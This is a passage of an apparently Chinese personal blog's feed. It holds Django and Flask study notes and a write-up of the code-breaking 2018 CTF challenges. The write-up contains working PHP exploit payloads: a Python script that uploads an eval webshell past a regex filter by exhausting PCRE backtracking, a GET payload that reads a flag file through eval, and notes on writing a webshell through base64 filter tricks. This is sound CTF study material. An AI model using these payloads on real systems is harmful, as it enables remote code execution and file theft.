class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">STATICFILES_DIRS = [</span><br><span class="line">os.path.join(BASE_DIR,<span class="string">'static'</span>)</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li></ol><h2 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h2><h3 id="mysql驱动程序安装"><a href="#mysql驱动程序安装" class="headerlink" title="mysql驱动程序安装"></a>mysql驱动程序安装</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install mysqlclient</span><br></pre></td></tr></table></figure><h3 id="配置数据库连接"><a href="#配置数据库连接" class="headerlink" title="配置数据库连接"></a>配置数据库连接</h3><p>在<code>settings.py</code>文件里配置<code>DATABASES</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">DATABASES = &#123;</span><br><span class="line">    <span class="string">'default'</span>: &#123;</span><br><span class="line">        <span class="string">'ENGINE'</span>: <span class="string">'django.db.backends.mysql'</span>,</span><br><span class="line">        <span class="string">'NAME'</span>: <span class="string">'webtest'</span>,</span><br><span class="line">        <span class="string">'USER'</span>: <span class="string">'root'</span>,</span><br><span class="line">        <span class="string">'PASSWORD'</span>: <span class="string">''</span>,</span><br><span class="line">        <span class="string">'HOST'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'PORT'</span>: <span class="string">'3306'</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="原生sql语句操作数据库"><a href="#原生sql语句操作数据库" class="headerlink" title="原生sql语句操作数据库"></a>原生sql语句操作数据库</h3><h4 id="使用connection对象"><a href="#使用connection对象" class="headerlink" title="使用connection对象"></a>使用connection对象</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> connection</span><br><span class="line"></span><br><span class="line">cursor=connection.cursor()</span><br><span class="line">    cursor.execute(<span class="string">"select * from user"</span>)</span><br><span class="line">    rows = cursor.fetchall()</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> rows:</span><br><span class="line">        print(row)</span><br></pre></td></tr></table></figure><h4 id="PYTHON-DB-API规范下cursor对象常用接口"><a href="#PYTHON-DB-API规范下cursor对象常用接口" class="headerlink" title="PYTHON DB API规范下cursor对象常用接口"></a>PYTHON DB API规范下cursor对象常用接口</h4><ul><li><code>rowcount</code>: 返回执行sql语句后受影响的行数</li><li><code>close</code>: 关闭游标</li><li><p><code>execute(sql[,parameters])</code>:执行sql语句</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cursor.execute(<span class="string">"select * from user where id=%s"</span>,(<span class="number">2</span>,))</span><br></pre></td></tr></table></figure></li><li><p><code>fetchone</code>:执行查询操作后，获取第一条数据</p></li><li><code>fetchmany(size)</code>: 获取size条数据</li><li><code>fetchall</code>: 获取所有数据 <h3 id="ORM模型"><a href="#ORM模型" class="headerlink" title="ORM模型"></a>ORM模型</h3></li><li><code>ORM</code>: Object Relational Mapping</li><li>ORM映射<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># models.py</span></span><br><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"><span class="comment"># Create your models here.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    <span class="comment"># id:int类型，自增长</span></span><br><span class="line">    id = models.AutoField(primary_key=<span class="keyword">True</span>)</span><br><span class="line">    <span class="comment"># name: varchar(20),不允许为空</span></span><br><span class="line">    name =models.CharField(max_length=<span class="number">20</span>,null=<span class="keyword">False</span>)</span><br><span class="line">    age = models.IntegerField(null=<span class="keyword">False</span>,default=<span class="number">18</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">"&lt;Student:(&#123;name&#125;,&#123;age&#125;)&gt;"</span>.format(name=self.name,age=self.age)</span><br><span class="line"><span class="comment"># 使用makemigrations生成迁移脚本文件</span></span><br><span class="line"><span class="comment"># 虚拟环境下在项目路径: python manage.py makemigrations</span></span><br><span class="line"><span class="comment"># 使用migrate将新生成的迁移脚本文件映射到数据库中</span></span><br><span class="line"><span class="comment"># python manage.py migrate</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 一个模型的对象，对应数据库表中的一条数据</span></span><br><span class="line"><span class="comment">#student1 =Student(name='chenxiyuan',age=19)</span></span><br><span class="line"><span class="comment"># save方法，将数据保存到数据库</span></span><br><span class="line"><span class="comment">#student1.save()</span></span><br><span class="line"><span class="comment"># delete方法，从数据库中删除这条数据</span></span><br><span class="line"><span class="comment">#student1.delete()</span></span><br></pre></td></tr></table></figure></li></ul><p>要记着在<code>settings.py</code>设置<code>INSTALLED_APPS</code>里安装app，配置好数据库。</p><ul><li>增删改查<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#views.py</span></span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> Student</span><br><span class="line"><span class="keyword">from</span> django.gttp <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(request)</span>:</span></span><br><span class="line"><span class="comment">#根据主键进行查找</span></span><br><span class="line">student1 = Student.objects.get(pk=<span class="number">1</span>)</span><br><span class="line">print(student1)</span><br><span class="line"><span class="comment">#&lt;Student:(chenxiyuan,19)&gt;</span></span><br><span class="line"><span class="comment">#根据其他条件进行查找</span></span><br><span class="line">student2 = Student.objects.filter(name=<span class="string">'chenxiyuan'</span>)</span><br><span class="line"><span class="comment"># save方法，将数据保存到数据库</span></span><br><span class="line"><span class="comment">#student1.save()</span></span><br><span class="line"><span class="comment"># delete方法，从数据库中删除这条数据</span></span><br><span class="line"><span class="comment">#student1.delete()</span></span><br><span class="line"><span class="comment">#改就是先查后改再save</span></span><br><span class="line"><span class="keyword">return</span> Httpresponse(<span class="string">"success"</span>)</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Django学习&quot;&gt;&lt;a href=&quot;#Django学习&quot; class=&quot;headerlink&quot; title=&quot;Django学习&quot;&gt;&lt;/a&gt;Django学习&lt;/h1&gt;&lt;h2 id=&quot;搭建虚拟环境&quot;&gt;&lt;a href=&quot;#搭建虚拟环境&quot; class=&quot;headerlink&quot; title=&quot;搭建虚拟环境&quot;&gt;&lt;/a&gt;搭建虚拟环境&lt;/h2&gt;&lt;h3 id=&quot;安装virtualenv&quot;&gt;&lt;a href=&quot;#安装virtualenv&quot; class=&quot;headerlink&quot; title=&quot;安装virtualenv&quot;&gt;&lt;/a&gt;安装virtualenv&lt;/h3&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;pip3 install virtualenv&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;开辟虚拟空间&lt;/p&gt;
&lt;figure class=&quot;highlight cmd&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;virtualenv Django&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#也可以通过-p参数指定python解释器&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;virtualenv -p C:\Python27\python.exe [virtualenv name]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;激活虚拟环境&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;linux/mac: source Django/bin/activate&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;windows: cd Django/Scripts 执行activate&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;退出虚拟环境: deactivate&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="python学习笔记" scheme="http://chenxiyuan.vip/categories/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="python" scheme="http://chenxiyuan.vip/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>code-breaking2018代码审计学习</title>
    <link href="http://chenxiyuan.vip/2019/07/13/code-breaking2018%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/"/>
    <id>http://chenxiyuan.vip/2019/07/13/code-breaking2018代码审计学习/</id>
    <published>2019-07-13T05:56:12.000Z</published>
    <updated>2019-07-13T10:17:07.986Z</updated>
    
    <content type="html"><![CDATA[<p>我现在这个水平， 每做一道题都会触及到知识盲区，只好看wp做做总结，先拓宽知识储备吧。<br><a href="https://github.com/phith0n/code-breaking" target="_blank" rel="noopener">github地址</a></p><h2 id="easy-–-function"><a href="#easy-–-function" class="headerlink" title="easy – function"></a>easy – function</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$action = $_GET[<span class="string">'action'</span>] ?? <span class="string">''</span>;</span><br><span class="line">$arg = $_GET[<span class="string">'arg'</span>] ?? <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>, $action)) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $action(<span class="string">''</span>, $arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题想让我们知道\的作用。php里默认命名空间是\，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name()这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。<br>然后就可以利用create_function()任意代码执行。<br><a id="more"></a></p><h2 id="easy-pcrewaf"><a href="#easy-pcrewaf" class="headerlink" title="easy pcrewaf"></a>easy pcrewaf</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_FILES)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user_dir = <span class="string">'./data/'</span>;</span><br><span class="line">$data = file_get_contents($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line"><span class="keyword">if</span> (is_php($data)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"bad request"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    @mkdir($user_dir, <span class="number">0755</span>);</span><br><span class="line">    $path = $user_dir . <span class="string">'/'</span> . random_int(<span class="number">0</span>, <span class="number">10</span>) . <span class="string">'.php'</span>;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $path);</span><br><span class="line"></span><br><span class="line">    header(<span class="string">"Location: $path"</span>, <span class="keyword">true</span>, <span class="number">303</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题需要了解php的正则回溯机制。<br>正则引擎主要可以分为基本不同的两大类：一种是DFA（确定型有穷自动机），另一种是NFA（不确定型有穷自动机）。简单来讲，NFA 对应的是正则表达式主导的匹配，而DFA对应的是文本主导的匹配。DFA从匹配文本入手，从左到右，每个字符不会匹配两次，它的时间复杂度是多项式的，所以通常情况下，它的速度更快，但支持的特性很少，不支持捕获组、各种引用等等；而NFA则是从正则表达式入手，不断读入字符，尝试是否匹配当前正则，不匹配则吐出字符重新尝试，通常它的速度比较慢，最优时间复杂度为多项式的，最差情况为指数级的。但NFA支持更多的特性，因而绝大多数编程场景下（包括java，js），我们面对的是NFA。<br>pcre.backtrack_limit这个配置决定了在php中，正则引擎回溯的层数。而这个值默认是1000000.<br>exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">'file'</span>: BytesIO(<span class="string">b'&lt;?php eval($_POST['</span>cxy<span class="string">']);//'</span> + <span class="string">b'a'</span> * <span class="number">1000000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">'http://192.168.91.133:8088//index.php'</span>, files=files, allow_redirects=<span class="keyword">False</span>)</span><br><span class="line">print(res.headers)</span><br></pre></td></tr></table></figure></p><h2 id="easy-phpmagic"><a href="#easy-phpmagic" class="headerlink" title="easy - phpmagic"></a>easy - phpmagic</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'read-source'</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">define(<span class="string">'DATA_DIR'</span>, dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!is_dir(DATA_DIR)) &#123;</span><br><span class="line">    mkdir(DATA_DIR, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">chdir(DATA_DIR);</span><br><span class="line"></span><br><span class="line">$domain = <span class="keyword">isset</span>($_POST[<span class="string">'domain'</span>]) ? $_POST[<span class="string">'domain'</span>] : <span class="string">''</span>;</span><br><span class="line">$log_name = <span class="keyword">isset</span>($_POST[<span class="string">'log'</span>]) ? $_POST[<span class="string">'log'</span>] : date(<span class="string">'-Y-m-d'</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST) &amp;&amp; $domain):</span><br><span class="line">    $command = sprintf(<span class="string">"dig -t A -q %s"</span>, escapeshellarg($domain));</span><br><span class="line">    $output = shell_exec($command);</span><br><span class="line"></span><br><span class="line">    $output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES);</span><br><span class="line"></span><br><span class="line">    $log_name = $_SERVER[<span class="string">'SERVER_NAME'</span>] . $log_name;</span><br><span class="line">    <span class="keyword">if</span>(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>], <span class="keyword">true</span>)) &#123;</span><br><span class="line">        file_put_contents($log_name, $output);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> $output;</span><br><span class="line"><span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这道题利用base64编码绕过过滤，然后利用php伪协议解码写入webshell， php解析的时候，会忽略乱码，从&lt;?php开始解析。<br>这里还有一个小trick，在后缀名后加上/.，pathinfo就取不到后缀名，且可以正常写入.php之中。本题$_SERVER[‘SERVER_NAME’]取的是HOST，所以一切都可控了。<br><img src="http://i2.tiimg.com/665720/515bdf159b5c3aab.png" alt="Markdown"><br>刚开始写入文件怎么都是空的，因为base64中的=只能出现在最末尾，而我们插入的字符串是在中间的，所以我们插入的字符串里不能有=，只要把==删除就可以了</p><h2 id="easy-phplimit"><a href="#easy-phplimit" class="headerlink" title="easy - phplimit"></a>easy - phplimit</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里只能调用函数，没办法传入字符串<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poc: 1=readfile(%27../flag_phpbyp4ss%27);//&amp;code=eval(implode(reset(get_defined_vars())));</span><br></pre></td></tr></table></figure></p><p>implode() 函数返回由数组元素组合成的字符串。<br>reset() 函数将内部指针指向数组中的第一个元素，并输出。<br>get_defined_vars() 返回由所有已定义变量所组成的数组。<br>还有一个巧妙的方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我现在这个水平， 每做一道题都会触及到知识盲区，只好看wp做做总结，先拓宽知识储备吧。&lt;br&gt;&lt;a href=&quot;https://github.com/phith0n/code-breaking&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;github地址&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;easy-–-function&quot;&gt;&lt;a href=&quot;#easy-–-function&quot; class=&quot;headerlink&quot; title=&quot;easy – function&quot;&gt;&lt;/a&gt;easy – function&lt;/h2&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$action = $_GET[&lt;span class=&quot;string&quot;&gt;&#39;action&#39;&lt;/span&gt;] ?? &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$arg = $_GET[&lt;span class=&quot;string&quot;&gt;&#39;arg&#39;&lt;/span&gt;] ?? &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(preg_match(&lt;span class=&quot;string&quot;&gt;&#39;/^[a-z0-9_]*$/isD&#39;&lt;/span&gt;, $action)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    show_source(&lt;span class=&quot;keyword&quot;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $action(&lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;, $arg);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这道题想让我们知道\的作用。php里默认命名空间是\，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name()这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。&lt;br&gt;然后就可以利用create_function()任意代码执行。&lt;br&gt;
    
    </summary>
    
      <category term="web安全学习笔记" scheme="http://chenxiyuan.vip/categories/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="ctf" scheme="http://chenxiyuan.vip/tags/ctf/"/>
    
      <category term="代码审计" scheme="http://chenxiyuan.vip/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>flask框架学习</title>
    <link href="http://chenxiyuan.vip/2019/07/09/flask%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/"/>
    <id>http://chenxiyuan.vip/2019/07/09/flask框架学习/</id>
    <published>2019-07-09T11:35:11.000Z</published>
    <updated>2019-07-12T02:10:31.272Z</updated>
    
    <content type="html"><![CDATA[<h1 id="flask框架学习"><a href="#flask框架学习" class="headerlink" title="flask框架学习"></a>flask框架学习</h1><h2 id="搭建虚拟环境"><a href="#搭建虚拟环境" class="headerlink" title="搭建虚拟环境"></a>搭建虚拟环境</h2><p>安装virtualenv<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install virtualenv</span><br></pre></td></tr></table></figure></p><p>开辟虚拟空间<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virtualenv flask-env</span><br></pre></td></tr></table></figure></p><p>激活虚拟环境<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">linux/mac: source flask-env/bin/activate</span><br><span class="line">windows: cd flask-env/Scripts 执行activate</span><br><span class="line">退出虚拟环境: deactivate</span><br></pre></td></tr></table></figure></p><a id="more"></a><p>虚拟环境安装flask<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install flask</span><br></pre></td></tr></table></figure></p><h2 id="创建flask项目"><a href="#创建flask项目" class="headerlink" title="创建flask项目"></a>创建flask项目</h2><p>我用pycharm创建一个flask项目，interpreter要选择自己的虚拟环境里的python.exe。然后就成功生成一个简单的模板。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask  <span class="comment">#从flask这个框架中导入Flask这个类</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化一个Flask对象</span></span><br><span class="line"><span class="comment"># Flask()</span></span><br><span class="line"><span class="comment"># 需要传递一个参数__name__</span></span><br><span class="line"><span class="comment"># 1.方便flask框架去寻找资源</span></span><br><span class="line"><span class="comment"># 2.方便flask插件比如Flask-Sqlalchemy出现错误的时候，找到问题所在的位置</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># @app.route 是一个装饰器</span></span><br><span class="line"><span class="comment"># @开头,并且在函数的上面，说明是装饰器</span></span><br><span class="line"><span class="comment"># 这个装饰器的作用，是做一个url与视图函数的映射</span></span><br><span class="line"><span class="comment"># 127.0.0.1:5000/  -&gt;去请求hello_world这个函数，然后将请求结果返回给浏览器</span></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"Hello chenxiyuan"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 